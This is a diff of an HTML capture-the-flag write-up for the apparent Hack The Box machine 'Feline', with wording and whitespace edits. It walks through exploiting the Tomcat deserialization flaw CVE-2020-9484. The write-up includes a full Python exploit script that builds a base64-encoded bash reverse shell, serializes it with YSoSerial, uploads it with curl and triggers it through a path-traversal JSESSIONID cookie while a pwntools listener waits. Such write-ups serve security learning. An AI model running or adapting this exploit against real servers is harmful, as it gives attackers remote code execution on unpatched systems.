@@ -56,13 +56,13 @@ body {
 	 <h3><i>EXPLOITATION</i></h3>																										<br/> <br/>
 	 So far we have confirmed our target is vulnerable to <b>CVE-2020-9484</b>, and we are able to successfully trigger a stack traceback attempting to execute our file.									<br/> <br/>
 	 
-	 Since this is a vulnerability centered around insecure deserialization, we will now need to serialize our payload. Some digging around google revealed YSoSerial to be the most popular tool.						<br/> 
+	 Since this is a vulnerability centered around insecure java deserialization, we will now need to serialize our payload. Some digging around google revealed YSoSerial to be the most popular tool.						<br/> 
 	 The exploitation examples for YSoSerial that I was able to find all followed the same format. Generate a bash payload, serialize the payload with YSoSerial, and shoot it at the server (usually through burpsuite).			<br/> <br/>
 	 
 	 From here we need to do a couple things:
 	 <ol>
 		 <li> Generate a bash rev shell one liner 						    </li>
-		 <li> Use YSoSerial to serialize our encoded command and create the .session file           </li>
+		 <li> Use YSoSerial to serialize our command and create the .session file           	    </li>
 		 <li> Start up a nc listener								    </li>
 		 <li> Curl command to upload our new .session file		    			    </li>
 		 <li> Curl command to execute our new .session file		    			    </li>
@@ -72,7 +72,7 @@ body {
 	 Let's generate our rev shell command and try to enocode with YSoSerial. I started out with a simple bash one liner.											<br/> <br/>			
 	 <img src="images/feline/bash-one-liner.PNG" alt="bash one liner" class="inline"/> 															<br/> <br/> <br/> 
 	 	
-	 Now to run complex commands that pipe command into other commands in java the arguments needs to be a string Array. This presents									<br/> 
+	 Now to run complex commands that pipe command into other commands in java, the arguments need to be a string Array. This presents									<br/> 
 	 problems for us as our command is fairly complex. Basically, we need to find a way to run our bash one liner without using spaces.									<br/> <br/> 
 	 
 	 <a href="http://jackson-t.ca/runtime-exec-payloads.html">I found a cool site here which formats your JRE payload for you</a>										<br/> <br/> 
@@ -86,7 +86,7 @@ body {
 <pre>
 #!/usr/bin/python3
 
-import requests, base64
+import base64
 from pwn import *
 from termcolor import colored
 
@@ -95,11 +95,13 @@ my_port = "9000"
 ysoserial_path = '/opt/ysoserial-master-6eca5bc740-1.jar'
 upload_url = 'http://feline.htb:8080/upload.jsp'
 
+
 # Helper func to generate random filename
 def get_random_string(length):
     letters = string.ascii_lowercase
     result_str = ''.join(random.choice(letters) for i in range(length))
     return result_str
+
 
 # Helper func to run bash
 def run_bash(cmd):
@@ -113,8 +115,10 @@ def run_bash(cmd):
     else:
         print(colored('[-] Failed with exit code ' + str(exit_code), 'red'))
 
+
 # Generate a random 6 character filename to use
 fname = get_random_string(6).capitalize()
+
 
 # Create our .session file with JRE command from 
 # http://jackson-t.ca/runtime-exec-payloads.html
@@ -126,18 +130,22 @@ jre_cmd = 'bash -c {echo,' + encoded + '}|{base64,-d}|{bash,-i}'
 serialize_cmd = 'java -jar ' + ysoserial_path + ' CommonsCollections2 ' + '\"' + jre_cmd + '\" > ' + fname + '.session'
 run_bash(serialize_cmd)
 
+
 # Attempt to upload payload
 cmd = 'curl -sS ' + '\'' + upload_url + '\'' + ' -F \"image=@' + fname + '.session\" > /dev/null' 
 run_bash(cmd)
+
 
 # Startup pwntools listener
 print(colored('Starting nc listener', 'green'))
 l = listen(my_port)
 print(colored('[+] Success', 'green'))
 
+
 # Execute payload
 cmd = 'curl -sS ' + '\'' + upload_url + '\'' + ' -H \"Cookie: JSESSIONID=../../../opt/samples/uploads/' + fname + '\" > /dev/null'
 run_bash(cmd)
+
 
 # Interact with our listener
 l.interactive()
